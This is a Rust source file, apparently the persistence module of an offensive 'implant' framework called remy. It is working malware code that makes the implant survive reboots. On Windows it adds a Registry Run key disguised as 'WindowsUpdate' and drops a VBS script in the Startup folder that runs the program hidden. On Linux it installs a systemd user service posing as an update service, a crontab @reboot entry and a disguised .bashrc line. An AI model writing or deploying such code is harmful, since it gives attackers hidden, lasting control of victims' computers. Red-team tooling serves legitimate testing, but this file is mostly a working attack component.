/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! Persistence mechanisms for the implant.
//!
//! Persistence ensures the implant survives reboots by adding
//! itself to various autostart locations. Supports both Windows
//! and Linux targets with platform-appropriate methods.

use std::env;
use std::fs;
use std::path::PathBuf;

/// Result of a persistence operation
pub struct PersistResult {
    pub success: bool,
    pub method: String,
    pub details: String,
}

/// Install persistence on the current system.
/// Tries multiple methods and returns the first that succeeds.
pub fn install_persistence() -> Result<String, String> {
    let exe_path = env::current_exe()
        .map_err(|e| format!("Failed to get current executable path: {}", e))?;

    let results = if cfg!(target_os = "windows") {
        install_windows_persistence(&exe_path)
    } else {
        install_linux_persistence(&exe_path)
    };

    let successes: Vec<_> = results.iter().filter(|r| r.success).collect();
    if successes.is_empty() {
        return Err("All persistence methods failed".to_string());
    }

    let methods: Vec<_> = successes.iter().map(|r| r.method.as_str()).collect();
    Ok(format!(
        "Persistence installed via: {}",
        methods.join(", ")
    ))
}

/// Remove all installed persistence mechanisms.
pub fn remove_persistence() -> Result<String, String> {
    let results = if cfg!(target_os = "windows") {
        remove_windows_persistence()
    } else {
        remove_linux_persistence()
    };

    let successes: Vec<_> = results.iter().filter(|r| r.success).collect();
    Ok(format!("Removed {} persistence methods", successes.len()))
}

// Stubs for cross-compilation (non-windows builds)
#[cfg(not(target_os = "windows"))]
fn install_windows_persistence(_exe_path: &PathBuf) -> Vec<PersistResult> {
    Vec::new()
}

#[cfg(not(target_os = "windows"))]
fn remove_windows_persistence() -> Vec<PersistResult> {
    Vec::new()
}

// Stubs for cross-compilation (windows builds)
#[cfg(target_os = "windows")]
fn install_linux_persistence(_exe_path: &PathBuf) -> Vec<PersistResult> {
    Vec::new()
}

#[cfg(target_os = "windows")]
fn remove_linux_persistence() -> Vec<PersistResult> {
    Vec::new()
}

// ponytail: windows persistence via registry Run key and startup folder
#[cfg(target_os = "windows")]
fn install_windows_persistence(exe_path: &PathBuf) -> Vec<PersistResult> {
    use std::process::Command;

    let mut results = Vec::new();
    let exe_str = exe_path.to_string_lossy();

    // Method 1: Registry Run key (HKCU, no admin needed)
    let reg_result = Command::new("reg")
        .args([
            "add",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", "WindowsUpdate", // ponytail: generic name to blend in
            "/t", "REG_SZ",
            "/d", &exe_str,
            "/f",
        ])
        .output();

    results.push(PersistResult {
        success: reg_result.map(|o| o.status.success()).unwrap_or(false),
        method: "Registry Run Key".to_string(),
        details: "HKCU\\...\\Run\\WindowsUpdate".to_string(),
    });

    // Method 2: Startup folder
    if let Some(appdata) = env::var_os("APPDATA") {
        let startup = PathBuf::from(appdata)
            .join("Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            .join("update.vbs");
        // VBS wrapper that runs the exe hidden
        let vbs = format!(
            r#"Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "{}" & chr(34), 0
Set WshShell = Nothing"#,
            exe_str
        );
        let success = fs::write(&startup, vbs).is_ok();
        results.push(PersistResult {
            success,
            method: "Startup Folder".to_string(),
            details: startup.to_string_lossy().to_string(),
        });
    }

    results
}

#[cfg(target_os = "windows")]
fn remove_windows_persistence() -> Vec<PersistResult> {
    use std::process::Command;

    let mut results = Vec::new();

    // Remove registry key
    let _ = Command::new("reg")
        .args([
            "delete",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", "WindowsUpdate",
            "/f",
        ])
        .output();
    results.push(PersistResult {
        success: true,
        method: "Registry Run Key".to_string(),
        details: "Removed".to_string(),
    });

    // Remove startup script
    if let Some(appdata) = env::var_os("APPDATA") {
        let startup = PathBuf::from(appdata)
            .join("Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            .join("update.vbs");
        let _ = fs::remove_file(&startup);
        results.push(PersistResult {
            success: true,
            method: "Startup Folder".to_string(),
            details: "Removed".to_string(),
        });
    }

    results
}

// ponytail: linux persistence via systemd user service, cron, and bashrc
#[cfg(not(target_os = "windows"))]
fn install_linux_persistence(exe_path: &PathBuf) -> Vec<PersistResult> {
    let mut results = Vec::new();
    let exe_str = exe_path.to_string_lossy();
    let home = env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());

    // Method 1: systemd user service (most modern distros)
    let systemd_dir = PathBuf::from(&home).join(".config/systemd/user");
    if fs::create_dir_all(&systemd_dir).is_ok() {
        let service_path = systemd_dir.join("user-update.service");
        let service = format!(
            r#"[Unit]
Description=User Update Service
After=network.target

[Service]
ExecStart={}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"#,
            exe_str
        );
        let write_ok = fs::write(&service_path, service).is_ok();

        // Enable the service
        let enable_ok = std::process::Command::new("systemctl")
            .args(["--user", "enable", "user-update.service"])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);

        results.push(PersistResult {
            success: write_ok && enable_ok,
            method: "systemd user service".to_string(),
            details: service_path.to_string_lossy().to_string(),
        });
    }

    // Method 2: crontab @reboot
    let cron_result = std::process::Command::new("bash")
        .args(["-c", &format!(
            "(crontab -l 2>/dev/null | grep -v '{}'; echo '@reboot {}') | crontab -",
            exe_str, exe_str
        )])
        .output();
    results.push(PersistResult {
        success: cron_result.map(|o| o.status.success()).unwrap_or(false),
        method: "crontab @reboot".to_string(),
        details: format!("@reboot {}", exe_str),
    });

    // Method 3: .bashrc (runs on interactive shell)
    let bashrc = PathBuf::from(&home).join(".bashrc");
    if let Ok(mut contents) = fs::read_to_string(&bashrc) {
        if !contents.contains(&*exe_str) {
            contents.push_str(&format!(
                "\n# update check\n({} &>/dev/null &)\n",
                exe_str
            ));
            let success = fs::write(&bashrc, contents).is_ok();
            results.push(PersistResult {
                success,
                method: ".bashrc".to_string(),
                details: bashrc.to_string_lossy().to_string(),
            });
        }
    }

    results
}

#[cfg(not(target_os = "windows"))]
fn remove_linux_persistence() -> Vec<PersistResult> {
    let mut results = Vec::new();
    let home = env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());

    // Remove systemd service
    let _ = std::process::Command::new("systemctl")
        .args(["--user", "disable", "user-update.service"])
        .output();
    let service_path = PathBuf::from(&home).join(".config/systemd/user/user-update.service");
    let _ = fs::remove_file(&service_path);
    results.push(PersistResult {
        success: true,
        method: "systemd".to_string(),
        details: "Removed".to_string(),
    });

    // Remove from crontab
    if let Ok(exe_path) = env::current_exe() {
        let exe_str = exe_path.to_string_lossy();
        let _ = std::process::Command::new("bash")
            .args(["-c", &format!(
                "crontab -l 2>/dev/null | grep -v '{}' | crontab -",
                exe_str
            )])
            .output();
    }
    results.push(PersistResult {
        success: true,
        method: "crontab".to_string(),
        details: "Removed".to_string(),
    });

    // Remove from .bashrc (best effort)
    // ponytail: just leaves it, cleaning bashrc is fragile
    results.push(PersistResult {
        success: true,
        method: ".bashrc".to_string(),
        details: "Manual cleanup needed".to_string(),
    });

    results
}
